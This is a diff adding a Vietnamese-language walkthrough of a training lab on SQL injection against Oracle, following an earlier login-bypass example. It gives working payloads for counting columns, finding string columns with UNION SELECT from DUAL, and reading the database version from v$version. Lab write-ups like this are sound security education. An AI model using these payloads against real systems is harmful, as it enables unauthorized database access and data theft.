@@ -38,3 +38,26 @@ The final query becomes:
 ```sql
 SELECT * FROM users WHERE username = 'administrator';
 ```
+
+# SQL injection attack, querying the database type and version on Oracle
+## Lab Description
+![image](Picture/lab3.png)
+
+Trong `Oracle`, mọi câu lệnh SELECT đều phải có một bảng `FROM`. Và trong `Oracle` có một table có thể được dùng cho mục đích này tên là `dual`
+Và có 2 phương pháp khác nhau để truy vấn phiên bản cơ sở dữ liệu trên Oracle.
+`SELECT banner FROM v$version`, `SELECT version FROM v$instance`
+
+Để làm được bài tìm được columns chứa string. 
+Các bước thực hiện của bài này:
+- Đầu tiên xác định số columns của nó bằng cách inject `' ORDER BY 1--` ở đây 1 là số columns, ta tiếp tục tăng lên đến khi bị lỗi và xác định được là có 2 columns.
+  ```sql
+  SELECT * FROM someTable WHERE category = 'Pets' ORDER BY 2--
+  ```
+- Tiếp tục kiểm tra cột chứa string bằng `' UNION SELECT 'a','a' FROM DUAL--` ta xác định được 2 columns đều chứa string.
+  ```sql
+  SELECT * FROM someTable WHERE category = 'Pets' UNION SELECT 'a','a' FROM DUAL--
+  ```
+- Và cuối cùng để lấy thông tin version inject `' UNION SELECT 'a', banner FROM v$version--`
+  ```sql
+  SELECT * FROM someTable WHERE category='Pets' UNION SELECT 'a', banner FROM v$version--'
+  ```
